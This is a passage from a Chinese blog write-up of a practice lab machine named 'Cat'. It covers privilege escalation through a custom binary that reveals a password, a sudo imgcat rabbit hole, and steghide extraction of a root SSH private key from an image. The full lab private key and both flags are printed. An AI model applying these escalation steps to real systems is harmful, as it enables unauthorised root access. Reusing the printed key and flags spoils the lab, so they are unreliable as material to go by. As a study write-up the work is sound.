+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span>：标准的 Linux 命令，用于连接文件并在标准输出上打印它们的内容。</span><br><span class="line">precat：此命令在提供的参考材料中未找到相关解释。</span><br><span class="line">fallocate：此命令在提供的参考材料中未找到相关解释。</span><br><span class="line"><span class="built_in">truncate</span>：此命令在提供的参考材料中未找到相关解释。</span><br><span class="line">debconf-communicate：此命令在提供的参考材料中未找到相关解释。</span><br><span class="line">imgcat：此命令在提供的参考材料中未找到相关解释。</span><br><span class="line">catcatcat：此命令位于 /usr/local/bin，通常是用户或管理员自行创建的非系统标准命令，</span><br></pre></td></tr></table></figure>
+
+<p>所以其实这里很明显有一个很怪的二进制文件catcatcat，这个文件就是作者藏的提权突破点。</p>
+<p>执行之后会给catcatcat用户的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tomcat@Cat:/tmp$ catcatcat</span><br><span class="line">  /\_/\</span><br><span class="line"> ( o.o )</span><br><span class="line">  &gt; ^ &lt;</span><br><span class="line">    |     |     |</span><br><span class="line">password:this_is_cat_passwd</span><br></pre></td></tr></table></figure>
+
+<p>这里需要注意的是不要直接从tomcat shell上su - catcatcat根本登录不上，可能是因为nologin的原因。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#登录上catcatcat</span></span><br><span class="line">catcatcat@Cat:~$</span><br></pre></td></tr></table></figure>
+
+<p>catcatcat—&gt;root</p>
+<p>上到catcatcat用户之后目录下有一个cat.jpg文件，是一只猫….额，然后，我一开始习惯性的sudo -l查看了拥有的suid权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">catcatcat@Cat:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> catcatcat on Cat:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User catcatcat may run the following commands on Cat:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/imgcat</span><br></pre></td></tr></table></figure>
+
+<p>这里信息就告诉你有一个imgcat的命令可以利用，并且sudo -l种有env_reset所以这里利用预加载是无法劫持的（LD_PRE….）。</p>
+<p>然后先说说我当时怎么做的吧，我一开始也是觉得，这里有个suid权限imgcat那这个肯定是个突破点，但是这个突破点到后面才知道这玩意其实并不是一个很好的突破点，emm怎么说呢imgcat这个命令在网上其实没有什么太多能利用的漏洞，几乎可以说没有，然后你如果逆向给ai的话ai确实会说，欸，可以利用。但是这个过程很长（反正我没弄出来，我也不能说没漏洞吧……），也并不是预期解。其实预期解是cat.jpg这个图片突破点，将图片下载下来进行分析，然后这里需要了解一款工具<a href="note://WEBe7c7086756818107dc9918d7c4d83af1">steghide 一款专注于图片隐写的工具</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#首先分析图片exiftool</span></span><br><span class="line">┌──(root㉿kali)-[/home/kali1/cat]</span><br><span class="line">└─# exifexiftool cat.jpg</span><br><span class="line">ExifTool Version Number         : 12.76</span><br><span class="line">File Name                       : cat.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 4.5 MB</span><br><span class="line">File Modification Date/Time     : 2026:07:12 21:01:08+08:00</span><br><span class="line">File Access Date/Time           : 2026:07:12 21:01:45+08:00</span><br><span class="line">File Inode Change Date/Time     : 2026:07:12 21:01:08+08:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">JFIF Version                    : 1.01</span><br><span class="line">Resolution Unit                 : None</span><br><span class="line">X Resolution                    : 1</span><br><span class="line">Y Resolution                    : 1</span><br><span class="line">Image Width                     : 4096</span><br><span class="line">Image Height                    : 3072</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)</span><br><span class="line">Image Size                      : 4096x3072</span><br><span class="line">Megapixels                      : 12.6</span><br><span class="line"><span class="comment">#这里发现这个文件很大，有4兆多，虽然是个4k但是你丢给ai，ai会说比常规的图片来说大了</span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/home/kali1/cat]</span><br><span class="line">└─# steghide info cat.jpg</span><br><span class="line"><span class="string">&quot;cat.jpg&quot;</span>:</span><br><span class="line">  format: jpeg</span><br><span class="line">  capacity: 255.3 KB</span><br><span class="line">Try to get information about embedded data ? (y/n) y</span><br><span class="line">Enter passphrase:</span><br><span class="line">  embedded file <span class="string">&quot;id_rsa&quot;</span>:</span><br><span class="line">    size: 2.5 KB</span><br><span class="line">    encrypted: rijndael-128, cbc</span><br><span class="line">    compressed: <span class="built_in">yes</span></span><br></pre></td></tr></table></figure>
+
+<p>这里密码是空</p>
+<p>然后你就会发现一个id_rsa文件，提取隐藏文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali1/cat]</span><br><span class="line">└─# steghide extract -sf cat.jpg</span><br><span class="line">Enter passphrase:</span><br><span class="line">the file <span class="string">&quot;id_rsa&quot;</span> does already exist. overwrite ? (y/n) y</span><br><span class="line">wrote extracted data to <span class="string">&quot;id_rsa&quot;</span>.</span><br><span class="line">┌──(root㉿kali)-[/home/kali1/cat]</span><br><span class="line">└─# <span class="built_in">cat</span> id_rsa</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAtuThOpbz6mxR9dxZhkPlZONG/f9EHzs22ueDelKOhWn79kn5srJG</span><br><span class="line">1oV6yDzwpXZvJc6/BcWTgSVFQ1B0PKuY+Shm/VQTCQdRTwQEnjxt61GO2cUQISNjL+2C2D</span><br><span class="line">KF0V1w4GWIZJDDEnaB4MGYJX0NaCW4/q6fEqXsclsSF11TuyMZeJC4PmihTOLTtxQM3+ob</span><br><span class="line">p5wCnfWCqhWab+GCuZT23/9kt8m2bcSOs041U4QTP7q30e5KNYxakzwLTm+xsA+ulBpt26</span><br><span class="line">h75WMKFkAu+2vNzl56gjpXF8i5ML4uXib5wgDssu3yfm7PekP7oD/oer+eIkE1RGXMNvYV</span><br><span class="line">QOTiABTCAJbMEBf79RGvGcSXilHp38QmdKQeYfIA/N8cRmSIbiGtMHxZEEMpwbvTjZGfuo</span><br><span class="line">Dw8cS9TsHEszqKgeDk0JmbXnt/dyJafOAX6PUdxMZUL20AkTj68fI/oZWn6IrZqEIJF+6+</span><br><span class="line">MHF84upzRcXV4uKfbSQLvl0bNpczVg9dSxumYATJAAAFgDb47NA2+OzQAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBALbk4TqW8+psUfXcWYZD5WTjRv3/RB87Ntrng3pSjoVp+/ZJ+bKyRtaFesg88KV2</span><br><span class="line">byXOvwXFk4ElRUNQdDyrmPkoZv1UEwkHUU8EBJ48betRjtnFECEjYy/tgtgyhdFdcOBliG</span><br><span class="line">SQwxJ2geDBmCV9DWgluP6unxKl7HJbEhddU7sjGXiQuD5ooUzi07cUDN/qG6ecAp31gqoV</span><br><span class="line">mm/hgrmU9t//ZLfJtm3EjrNONVOEEz+6t9HuSjWMWpM8C05vsbAPrpQabduoe+VjChZALv</span><br><span class="line">trzc5eeoI6VxfIuTC+Ll4m+cIA7LLt8n5uz3pD+6A/6Hq/niJBNURlzDb2FUDk4gAUwgCW</span><br><span class="line">zBAX+/URrxnEl4pR6d/EJnSkHmHyAPzfHEZkiG4hrTB8WRBDKcG7042Rn7qA8PHEvU7BxL</span><br><span class="line">M6ioHg5NCZm157f3ciWnzgF+j1HcTGVC9tAJE4+vHyP6GVp+iK2ahCCRfuvjBxfOLqc0XF</span><br><span class="line">1eLin20kC75dGzaXM1YPXUsbpmAEyQAAAAMBAAEAAAGBALZPkPQGZT3YnBqoe9UK+S+IHs</span><br><span class="line">wyGIXJUPUEslrM0KTM8Qyg0PcAHvzYMXxIwtktJb5aSLBIMrEZpeFj4XpY0zQKwh7kH9Vw</span><br><span class="line">JezN5IyXUDqyIeOSPHHMBKNR7ov0UNBShKIqk7srUkilOPICCNfVv/eBItc82fSM0RVtEq</span><br><span class="line">uXrE9uvYUhPYd4ZNFvifuFURAjHU4GhdVPVeCViEzeTqEPjMfcnVlXCTKCLH0wCJgnn8h3</span><br><span class="line">J6VsEy0tq1v5Dowxar5F4d7TOE+/QewWWA2TICypaTCGPSJ4ioEm/7xakpvKBulbSu/unC</span><br><span class="line">nd2W9/hxkYqp0VkIsqtsbQ71SnoLblt/x0CzXzSd90Em11In1KNDDeoJFahCumUamGKSyC</span><br><span class="line">wesoIPLW9/EWk+9PVPDMPPKlPvD0O+IdwABqIKp5D6jRMBITrj5y0uZogeJ2ZjLd4uPxMr</span><br><span class="line">KMQkNkNczjA1r6y5hWeAmV0RvoX9jjtsi1bNbs7e5EhVgnguK7X0O67yCK32MjQnQgAQAA</span><br><span class="line">AMAdb8AkEleyabmqt7QYwBapQA8QsJmNJ6ucL9otclhn7yPpdzWeyp/8E7JsWWwmpvozzw</span><br><span class="line">3+aeWUWsQgqhBsjKPnxPDXaLRmD2RXPcE9A8IbJ8BckDejNz/czHarWW5PhS1ispqnNuyE</span><br><span class="line">9kN1a3s5E8e8A81xFwK2Dtu/LRk5oVYRIxm7AP8HzaxcxS3Gp8xQsGZ6NX1tAhtyVhVpOP</span><br><span class="line">L8TiizkDxbz/7FOKa8A7LHskyCF0eO59143nMA1nOhQclZs5AAAADBAO8nisX0+3soSdHC</span><br><span class="line">MV6np/TlikMYZUaQMRuFJ2iI9LHxQIcrxAJRxzvKeFmx7jPSPJ+P3x03QBhcVwUzvW4RCp</span><br><span class="line">2CIW5MFOMpHvWJT0VQ9xTlRu6cQULhfTO7dUlJ/pH/+n/PLbLWOUGXifHW4xFI5pfjR+jD</span><br><span class="line">1MFxM4SjtO5W8C+CHhbouKuLwosvFbp085flGkotNkJerpFz9OgmjeCulgep+CBN/8yejn</span><br><span class="line">bhM+r6ZuNKZHi7M5cNXrUpeemp2xuMwQAAAMEAw8bYKdxP53g+Fs2wnmvoTYfOqyQGiFvT</span><br><span class="line">33MHH2NSq7vz2sbWK+HU11zFU5jPXlA0LSCOk37XNgXQrCYUsvJxsHUJG9EZaUf9utj259</span><br><span class="line">JrjQGGJ0Bdt7S2f6wHXX7POYWpINnKmOoB3h938n8KklJC0WjxXIwiZi4uyrNG8bt9B1gc</span><br><span class="line">/2+VXDzprQJTRZ13xp80Zt8nPo7tDODnyCSHmB8JyQFjjtbfKY9WDo6XM/aQlLWe9KHVkc</span><br><span class="line">RxZMsNpcaqopIJAAAACHJvb3RAQ2F0AQI=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>这个就是root的私钥，然后用这个ssh就行了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.5.13</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">flag&#123;root-471e997ce8c23ad558c2935b88814ab3&#125;</span><br><span class="line"><span class="comment"># cat /home/catcatcat/user.txt</span></span><br><span class="line">flag&#123;user-081d683d33dde135a273b484ee70123b&#125;</span><br></pre></td></tr></table></figure>
+
+<p>复盘总结：</p>
+<p> 这个靶机总体来说不算很难，其实考察点介于找文件和分析文件之间。以及对linux系统目录的了解（比如&#x2F;usr&#x2F;local目录）可以看一下以前的笔记：<a href="note://WEBf1d2d85ab5a78b2101098abb13034441">linux各目录功能</a>。</p>
+<p>&#x2F;usr&#x2F;local&#x2F;目录是用于存放普通用户都可用的应用程序，而&#x2F;usr&#x2F;sbin目录则是用于存放超级管理员用的应用程序，&#x2F;usr&#x2F;bin则也是存放所有用户都可用的应用程序</p>
+<p>所以在没有任何线索的情况下&#x2F;usr&#x2F;local&#x2F;目录或许可以发现一些意外的存在。而&#x2F;bin和&#x2F;sbin这两个其实主要用于集中找suid权限的，或者也可以说不用找因为只要拿到目标用户之后查看suid权限就可以（至少这里 是这样）。</p>
+<p>而如果拿到了普通用户权限之后sudo -l有东西的情况下去钻研也没有什么进展的话，就可以尝试其他路子，有时候靶机的出题人会喜欢打兔子洞。也就是说思路不要太死板，如果不行则要注意有没有什么其他文件，这里的靶机就是，如果去钻研sudo imgcat命令你会发现这个命令似乎很难有进展，所以最好就是将目标转向家目录下，有一个cat.jpg的文件这是一只猫，可以将它弄下来用exiftool分析，之后一步一步分析到是否作者会将密钥放在这个图片种这种思路。这里的话是用了steghide（这是一款专注于将秘密在不影响目标文件的情况下潜入图片或者音频种的工具），所以这里也需要用这条命令的提取参数，将嵌入的密码提取。</p>
+<p>总的来说这个靶机给我带来了emm不少新思路吧，我以前说实话找提权文件挺死板的。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://lly-1122.github.io/catblog/2026/09/18/cat/" data-id="cuids5__aPRHazaCMvMN4EWeq" data-title="cat" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/catblog/tags/MazeSec/" rel="tag">MazeSec</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/catblog/tags/cat/" rel="tag">cat</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/catblog/tags/nmap/" rel="tag">nmap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/catblog/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/catblog/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/catblog/2026/09/18/noport/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          noport
+        
+      </div>
+    </a>
+  
+  
+    <a href="/catblog/2026/09/18/baker/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">baker</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/catblog/categories/%E5%B7%A5%E5%85%B7%E6%8A%80%E5%B7%A7/">工具技巧</a></li><li class="category-list-item"><a class="category-list-link" href="/catblog/categories/%E9%9A%8F%E7%AC%94/">随笔</a></li><li class="category-list-item"><a class="category-list-link" href="/catblog/categories/%E9%9D%B6%E5%9C%BAwriteup/">靶场writeup</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/catblog/tags/Hexo/" rel="tag">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/catblog/tags/MazeSec/" rel="tag">MazeSec</a></li><li class="tag-list-item"><a class="tag-list-link" href="/catblog/tags/acfun/" rel="tag">acfun</a></li><li class="tag-list-item"><a class="tag-list-link" href="/catblog/tags/baker/" rel="tag">baker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/catblog/tags/cat/" rel="tag">cat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/catblog/tags/gameshell/" rel="tag">gameshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/catblog/tags/hgbe/" rel="tag">hgbe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/catblog/tags/lingdong/" rel="tag">lingdong</a></li><li class="tag-list-item"><a class="tag-list-link" href="/catblog/tags/nmap/" rel="tag">nmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/catblog/tags/noport/" rel="tag">noport</a></li><li class="tag-list-item"><a class="tag-list-link" href="/catblog/tags/show/" rel="tag">show</a></li><li class="tag-list-item"><a class="tag-list-link" href="/catblog/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/catblog/tags/%E5%BB%BA%E7%AB%99/" rel="tag">建站</a></li><li class="tag-list-item"><a class="tag-list-link" href="/catblog/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/catblog/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/catblog/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/catblog/tags/MazeSec/" style="font-size: 16.67px;">MazeSec</a> <a href="/catblog/tags/acfun/" style="font-size: 10px;">acfun</a> <a href="/catblog/tags/baker/" style="font-size: 10px;">baker</a> <a href="/catblog/tags/cat/" style="font-size: 10px;">cat</a> <a href="/catblog/tags/gameshell/" style="font-size: 11.67px;">gameshell</a> <a href="/catblog/tags/hgbe/" style="font-size: 10px;">hgbe</a> <a href="/catblog/tags/lingdong/" style="font-size: 10px;">lingdong</a> <a href="/catblog/tags/nmap/" style="font-size: 18.33px;">nmap</a> <a href="/catblog/tags/noport/" style="font-size: 10px;">noport</a> <a href="/catblog/tags/show/" style="font-size: 10px;">show</a> <a href="/catblog/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">工具</a> <a href="/catblog/tags/%E5%BB%BA%E7%AB%99/" style="font-size: 10px;">建站</a> <a href="/catblog/tags/%E6%8F%90%E6%9D%83/" style="font-size: 15px;">提权</a> <a href="/catblog/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 20px;">渗透测试</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/catblog/archives/2026/10/">October 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/catblog/archives/2026/09/">September 2026</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/catblog/2026/10/12/unsafeai/">unsafeai</a>
+          </li>
+        
+          <li>
+            <a href="/catblog/2026/10/12/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">我的第一篇博客</a>
+          </li>
+        
+          <li>
+            <a href="/catblog/2026/10/12/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/catblog/2026/09/18/show/">show</a>
+          </li>
+        
+          <li>
+            <a href="/catblog/2026/09/18/lingdong/">lingdong</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/catblog/" class="mobile-nav-link">Home</a>
+  
+    <a href="/catblog/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/catblog/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/catblog/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/catblog/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
